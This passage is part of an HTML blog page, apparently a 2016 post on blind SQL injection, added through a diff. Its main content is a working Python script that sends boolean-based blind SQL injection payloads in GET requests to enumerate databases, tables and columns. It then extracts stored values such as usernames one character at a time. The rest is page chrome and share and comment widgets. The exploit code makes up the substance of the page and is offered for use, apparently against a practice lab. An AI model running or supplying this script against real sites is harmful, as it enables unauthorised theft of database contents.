%s&quot; % ((l+1),data_name))</div><div class="line">        tab.append(data_name)</div><div class="line">    print (&quot;Database: %s&quot; % table)</div><div class="line">    for h in tab:</div><div class="line">        print (&quot;|    %s&quot; % h)</div><div class="line">def getAllcontents(url,database,table,column):</div><div class="line">    # table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table)</div><div class="line">    # column_name_hex = &quot;0x&quot; + binascii.b2a_hex(column)</div><div class="line">    column_name_hex = &quot;0x757365726e616d65&quot;</div><div class="line">    db_name_hex = &quot;0x7365637572697479&quot;</div><div class="line">    table_name_hex = &quot;0x7573657273&quot;</div><div class="line">    num = 1</div><div class="line">    while(True):</div><div class="line">        db_url = url + &quot;&apos; and ((select count(%s) from %s limit 0,1) &gt; %d) --+&quot; % (column,table,num)</div><div class="line">        res = requests.get(db_url)</div><div class="line">        con = res.content</div><div class="line">        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">        if db_num is None:</div><div class="line">            break</div><div class="line">        else:</div><div class="line">            num += 1</div><div class="line">    print (&quot;%s number: %d&quot; % (column,num))</div><div class="line">    lol = num</div><div class="line">    print (lol)</div><div class="line">    column_num = []</div><div class="line">    colm = []</div><div class="line">    for x in range(0,lol):</div><div class="line">        num_col = 1</div><div class="line">        while(True):</div><div class="line">            db_url = url + &quot;&apos; and ((select length(%s) from %s limit %d,1) &gt; %d) --+&quot; % (column,table,x,num_col)</div><div class="line">            res = requests.get(db_url)</div><div class="line">            con = res.content</div><div class="line">            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">            if db_num is None:</div><div class="line">                break</div><div class="line">            else:</div><div class="line">                num_col += 1</div><div class="line">        print (&quot;Column : %s number: %d is : %s &quot; % (column,(x+1),num_col))</div><div class="line">        for op in range(1,(num_col+1)):</div><div class="line">            num_op = 1</div><div class="line">            while(True):</div><div class="line">                con_url = url + &quot;&apos; and ((select ascii(substr(%s, %d, 1)) from %s limit %d,1) &gt; %d) --+&quot; % (column,op,table,x,num_op)</div><div class="line">                res = requests.get(con_url)</div><div class="line">                con = res.content</div><div class="line">                db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">                if db_num is None:</div><div class="line">                    break</div><div class="line">                else:</div><div class="line">                    num_op += 1</div><div class="line">            column_num.append(chr(num_op))</div><div class="line">            print (&quot;Column : %s number: %d is : %s &quot; % (column,op,chr(num_op)))</div><div class="line">        col_data_name = &apos;&apos;.join(column_num)</div><div class="line">        print (col_data_name)</div><div class="line">        colm.append(col_data_name)</div><div class="line">    for h in colm:</div><div class="line">        print (&quot;|    %s&quot; % h)    </div><div class="line">def main():</div><div class="line">    if sys.argv[1] == &apos;--dbs&apos;:</div><div class="line">        getAllDatabases(sys.argv[2])</div><div class="line">    elif sys.argv[1] == &apos;--tab&apos;:</div><div class="line">        getAlltables(sys.argv[2],sys.argv[3])</div><div class="line">    elif sys.argv[1] == &apos;--col&apos;:</div><div class="line">        getAllcolumns(sys.argv[2],sys.argv[3],sys.argv[4])</div><div class="line">    elif sys.argv[1] == &apos;--dump&apos;:</div><div class="line">        getAllcontents(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])</div><div class="line">    else:</div><div class="line">        print (&apos;What...&apos;)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+  <div class="addthis addthis_toolbox addthis_default_style">
+    
+      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+    
+    
+      <a class="addthis_button_tweet"></a>
+    
+    
+      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    
+    
+      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
+    
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/07/sql注入之盲注/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Suche">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 liuqi
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
